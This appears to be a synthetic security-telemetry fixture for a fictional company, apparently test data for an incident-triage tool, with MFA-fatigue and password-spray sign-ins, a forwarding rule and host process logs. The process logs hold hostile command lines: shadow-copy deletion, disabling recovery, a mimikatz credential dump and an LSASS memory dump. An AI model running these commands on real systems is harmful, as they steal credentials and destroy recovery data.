@@ -1,0 +1,905 @@
+{
+  "users": {
+    "jdoe@contoso.com": {
+      "info": {
+        "object_id": "8d1f6c2a-1111-4c55-9a1b-2f0e9d6c7a01",
+        "display_name": "Jane Doe",
+        "enabled": true,
+        "privileged_roles": [],
+        "risk_level": "none"
+      },
+      "signins": [
+        {
+          "minutes_ago": 600,
+          "ip": "20.1.14.8",
+          "country": "US",
+          "city": "Kansas City",
+          "app": "Microsoft Teams",
+          "success": true,
+          "result_code": "0",
+          "failure_reason": "",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 95,
+          "ip": "20.1.14.8",
+          "country": "US",
+          "city": "Kansas City",
+          "app": "Outlook",
+          "success": true,
+          "result_code": "0",
+          "failure_reason": "",
+          "mfa_denied": false,
+          "risk": "none"
+        }
+      ],
+      "audit": []
+    },
+    "mgarcia@contoso.com": {
+      "info": {
+        "object_id": "8d1f6c2a-2222-4c55-9a1b-2f0e9d6c7a02",
+        "display_name": "Maria Garcia",
+        "enabled": true,
+        "privileged_roles": [],
+        "risk_level": "high"
+      },
+      "signins": [
+        {
+          "minutes_ago": 90,
+          "ip": "20.1.14.23",
+          "country": "US",
+          "city": "Kansas City",
+          "app": "Outlook",
+          "success": true,
+          "result_code": "0",
+          "failure_reason": "",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 44,
+          "ip": "198.51.100.23",
+          "country": "SG",
+          "city": "Singapore",
+          "app": "Office 365 Exchange Online",
+          "success": false,
+          "result_code": "500121",
+          "failure_reason": "MFA request denied by user",
+          "mfa_denied": true,
+          "risk": "high"
+        },
+        {
+          "minutes_ago": 42,
+          "ip": "198.51.100.23",
+          "country": "SG",
+          "city": "Singapore",
+          "app": "Office 365 Exchange Online",
+          "success": false,
+          "result_code": "500121",
+          "failure_reason": "MFA request denied by user",
+          "mfa_denied": true,
+          "risk": "high"
+        },
+        {
+          "minutes_ago": 40,
+          "ip": "198.51.100.23",
+          "country": "SG",
+          "city": "Singapore",
+          "app": "Office 365 Exchange Online",
+          "success": false,
+          "result_code": "500121",
+          "failure_reason": "MFA request timed out",
+          "mfa_denied": true,
+          "risk": "high"
+        },
+        {
+          "minutes_ago": 38,
+          "ip": "198.51.100.23",
+          "country": "SG",
+          "city": "Singapore",
+          "app": "Office 365 Exchange Online",
+          "success": false,
+          "result_code": "500121",
+          "failure_reason": "MFA request denied by user",
+          "mfa_denied": true,
+          "risk": "high"
+        },
+        {
+          "minutes_ago": 36,
+          "ip": "198.51.100.23",
+          "country": "SG",
+          "city": "Singapore",
+          "app": "Office 365 Exchange Online",
+          "success": true,
+          "result_code": "0",
+          "failure_reason": "",
+          "mfa_denied": false,
+          "risk": "high"
+        }
+      ],
+      "audit": [
+        {
+          "minutes_ago": 31,
+          "operation": "New-InboxRule",
+          "target": "mgarcia@contoso.com",
+          "detail": "ForwardTo: payroll-archive@protonmail.example; MarkAsRead: True; Name: ."
+        }
+      ]
+    },
+    "tthomas@contoso.com": {
+      "info": {
+        "object_id": "8d1f6c2a-3333-4c55-9a1b-2f0e9d6c7a03",
+        "display_name": "Tom Thomas",
+        "enabled": true,
+        "privileged_roles": [],
+        "risk_level": "none"
+      },
+      "signins": [
+        {
+          "minutes_ago": 300,
+          "ip": "20.1.14.40",
+          "country": "US",
+          "city": "Kansas City",
+          "app": "Windows Sign In",
+          "success": true,
+          "result_code": "0",
+          "failure_reason": "",
+          "mfa_denied": false,
+          "risk": "none"
+        }
+      ],
+      "audit": []
+    },
+    "svc-backup@contoso.com": {
+      "info": {
+        "object_id": "8d1f6c2a-4444-4c55-9a1b-2f0e9d6c7a04",
+        "display_name": "Backup Service",
+        "enabled": true,
+        "privileged_roles": [],
+        "risk_level": "none",
+        "on_prem_synced": true,
+        "sam_account_name": "svc-backup"
+      },
+      "signins": [],
+      "audit": []
+    },
+    "helpdesk01@contoso.com": {
+      "info": {
+        "object_id": "8d1f6c2a-5555-4c55-9a1b-2f0e9d6c7a05",
+        "display_name": "Helpdesk 01",
+        "enabled": true,
+        "privileged_roles": [],
+        "risk_level": "low"
+      },
+      "signins": [
+        {
+          "minutes_ago": 30.0,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 29.4,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 28.8,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 28.2,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 27.6,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 27.0,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 26.4,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 25.8,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 25.2,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 24.6,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 24.0,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 23.4,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 22.8,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 22.2,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 21.6,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 21.0,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 20.4,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 19.8,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 19.200000000000003,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 18.6,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 18.0,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 17.4,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 16.8,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 16.200000000000003,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 15.600000000000001,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 15.0,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 14.4,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 13.8,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 13.2,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 12.600000000000001,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 12.0,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 11.400000000000002,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 10.8,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 10.2,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 9.600000000000001,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 9.0,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 8.400000000000002,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 7.800000000000001,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 7.199999999999999,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 6.600000000000001,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 6.0,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 5.400000000000002,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 4.800000000000001,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 4.199999999999999,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 3.6000000000000014,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        },
+        {
+          "minutes_ago": 3.0,
+          "ip": "192.0.2.77",
+          "country": "NL",
+          "city": "Amsterdam",
+          "app": "Remote Desktop",
+          "success": false,
+          "result_code": "50126",
+          "failure_reason": "Invalid username or password",
+          "mfa_denied": false,
+          "risk": "none"
+        }
+      ],
+      "audit": []
+    }
+  },
+  "hosts": {
+    "wks-fin-042": {
+      "device_id": "a8c3f0e1b2d4c6e8f0a1b3c5d7e9f1a2b4c6d8e0",
+      "processes": [
+        {
+          "minutes_ago": 14,
+          "process": "powershell.exe",
+          "command_line": "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+          "parent": "WINWORD.EXE",
+          "sha256": "",
+          "account": "jdoe",
+          "signer": "Microsoft Corporation"
+        },
+        {
+          "minutes_ago": 13,
+          "process": "invoice_viewer.exe",
+          "command_line": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\invoice_viewer.exe --silent",
+          "parent": "powershell.exe",
+          "sha256": "8f3c2a5d9b1e4f6a7c0d2e9b5a3f1c8d7e6b4a2f9c1d3e5b7a9f0c2e4d6b8a1f",
+          "account": "jdoe",
+          "signer": ""
+        },
+        {
+          "minutes_ago": 12,
+          "process": "vssadmin.exe",
+          "command_line": "vssadmin.exe delete shadows /all /quiet",
+          "parent": "invoice_viewer.exe",
+          "sha256": "",
+          "account": "jdoe",
+          "signer": "Microsoft Corporation"
+        },
+        {
+          "minutes_ago": 12,
+          "process": "bcdedit.exe",
+          "command_line": "bcdedit.exe /set {default} recoveryenabled No",
+          "parent": "invoice_viewer.exe",
+          "sha256": "",
+          "account": "jdoe",
+          "signer": "Microsoft Corporation"
+        }
+      ],
+      "connections": [
+        {
+          "remote_ip": "203.0.113.66",
+          "remote_port": 443,
+          "count": 64,
+          "remote_url": "",
+          "process": "invoice_viewer.exe"
+        },
+        {
+          "remote_ip": "52.96.10.12",
+          "remote_port": 443,
+          "count": 6,
+          "remote_url": "outlook.office365.com",
+          "process": "OUTLOOK.EXE"
+        }
+      ]
+    },
+    "wks-it-007": {
+      "device_id": "b9d4e1f2c3a5b7d9e1f3a5c7e9b1d3f5a7c9e1b3",
+      "processes": [
+        {
+          "minutes_ago": 20,
+          "process": "InventoryAgent.exe",
+          "command_line": "\"C:\\Program Files\\Contoso\\InventoryAgent\\InventoryAgent.exe\" /collect",
+          "parent": "services.exe",
+          "sha256": "4e9d2b7f1a6c3e8d0b5f9a2c7e4d1b6f8a3c0e5d9b2f7a4c1e6d8b3f0a5c9e2d",
+          "account": "SYSTEM",
+          "signer": "Contoso IT"
+        },
+        {
+          "minutes_ago": 20,
+          "process": "powershell.exe",
+          "command_line": "powershell.exe -NoProfile -EncodedCommand RwBlAHQALQBDAGkAbQBJAG4AcwB0AGEAbgBjAGUA",
+          "parent": "InventoryAgent.exe",
+          "sha256": "",
+          "account": "SYSTEM",
+          "signer": "Microsoft Corporation"
+        }
+      ],
+      "connections": [
+        {
+          "remote_ip": "52.96.10.12",
+          "remote_port": 443,
+          "count": 2,
+          "remote_url": "inventory.contoso.com",
+          "process": "InventoryAgent.exe"
+        }
+      ]
+    },
+    "dc01": {
+      "device_id": "c0e5f2a3d4b6c8e0f2a4b6d8f0c2e4a6b8d0f2a4",
+      "processes": [
+        {
+          "minutes_ago": 9,
+          "process": "powershell.exe",
+          "command_line": "powershell.exe -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
+          "parent": "wmiprvse.exe",
+          "sha256": "",
+          "account": "svc-backup",
+          "signer": "Microsoft Corporation"
+        },
+        {
+          "minutes_ago": 8,
+          "process": "m64.exe",
+          "command_line": "m64.exe privilege::debug sekurlsa::logonpasswords exit",
+          "parent": "powershell.exe",
+          "sha256": "b0d5f9c3e7a1b4d8f2c6e0a9b3d7f1c5e9a2b6d0f4c8e1a5b9d3f7c0e4a8b2d6",
+          "account": "svc-backup",
+          "signer": ""
+        },
+        {
+          "minutes_ago": 8,
+          "process": "rundll32.exe",
+          "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Windows\\Temp\\lsass.dmp full",
+          "parent": "powershell.exe",
+          "sha256": "",
+          "account": "svc-backup",
+          "signer": "Microsoft Corporation"
+        }
+      ],
+      "connections": []
+    },
+    "srv-jump-01": {
+      "device_id": "d1f6a3b4e5c7d9f1a3b5c7e9a1c3e5b7d9f1a3c5",
+      "processes": [],
+      "connections": []
+    },
+    "wks-fin-017": {
+      "device_id": "e2a7b4c5f6d8e0a2b4c6d8f0b2d4f6a8c0e2b4d6",
+      "processes": [],
+      "connections": []
+    }
+  },
+  "prevalence": {
+    "8f3c2a5d9b1e4f6a7c0d2e9b5a3f1c8d7e6b4a2f9c1d3e5b7a9f0c2e4d6b8a1f": {
+      "hosts": [
+        "wks-fin-042",
+        "wks-fin-017"
+      ],
+      "device_count": 2
+    },
+    "203.0.113.66": {
+      "hosts": [
+        "wks-fin-042"
+      ],
+      "device_count": 1
+    },
+    "4e9d2b7f1a6c3e8d0b5f9a2c7e4d1b6f8a3c0e5d9b2f7a4c1e6d8b3f0a5c9e2d": {
+      "hosts": [
+        "wks-it-001",
+        "wks-it-002",
+        "wks-it-007",
+        "wks-hr-003",
+        "wks-fin-011"
+      ],
+      "device_count": 212
+    },
+    "b0d5f9c3e7a1b4d8f2c6e0a9b3d7f1c5e9a2b6d0f4c8e1a5b9d3f7c0e4a8b2d6": {
+      "hosts": [
+        "dc01"
+      ],
+      "device_count": 1
+    },
+    "192.0.2.77": {
+      "hosts": [],
+      "device_count": 0
+    },
+    "198.51.100.23": {
+      "hosts": [],
+      "device_count": 0
+    }
+  }
+}
